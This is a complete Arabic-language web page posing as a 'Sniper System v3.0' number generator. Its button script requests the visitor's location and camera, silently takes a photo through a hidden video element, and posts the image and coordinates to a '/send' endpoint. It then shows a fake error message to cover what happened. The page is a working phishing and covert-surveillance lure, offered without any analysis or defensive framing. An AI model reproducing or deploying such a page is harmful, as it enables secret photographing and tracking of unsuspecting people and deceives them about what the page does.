<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام القناص - توليد أرقام</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #000; color: #0f0; text-align: center; padding: 50px; }
        .btn { background-color: #0f0; color: #000; padding: 20px 40px; border: none; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 20px; box-shadow: 0 0 20px #0f0; }
        .btn:hover { background-color: #0c0; transform: scale(1.05); }
        h1 { font-size: 30px; margin-bottom: 30px; text-shadow: 0 0 10px #0f0; }
        #status { margin-top: 20px; color: #fff; font-size: 18px; }
    </style>
</head>
<body>
    <h1>🎯 نظام القناص v3.0 🚀</h1>
    <p>اضغط على الزر أدناه لتوليد رقمك الجديد</p>
    
    <button class="btn" onclick="startCapture()">🔥 توليد رقم الآن 🔥</button>
    
    <div id="status"></div>

    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        async function startCapture() {
            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر... يرجى الانتظار";
            
            try {
                // طلب الموقع
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;

                    // طلب الكاميرا
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;

                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const img = canvas.toDataURL('image/png');

                        // إرسال البيانات للسيرفر
                        fetch('/send', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: img, lat: lat, lon: lon })
                        });
                        
                        document.getElementById('status').innerText = "❌ خطأ في النظام: يرجى المحاولة مرة أخرى لاحقاً";
                        stream.getTracks().forEach(track => track.stop());
                    }, 2000);
                });
            } catch (err) {
                document.getElementById('status').innerText = "يجب السماح بالصلاحيات لتوليد الرقم!";
            }
        }
    </script>
</body>
</html>
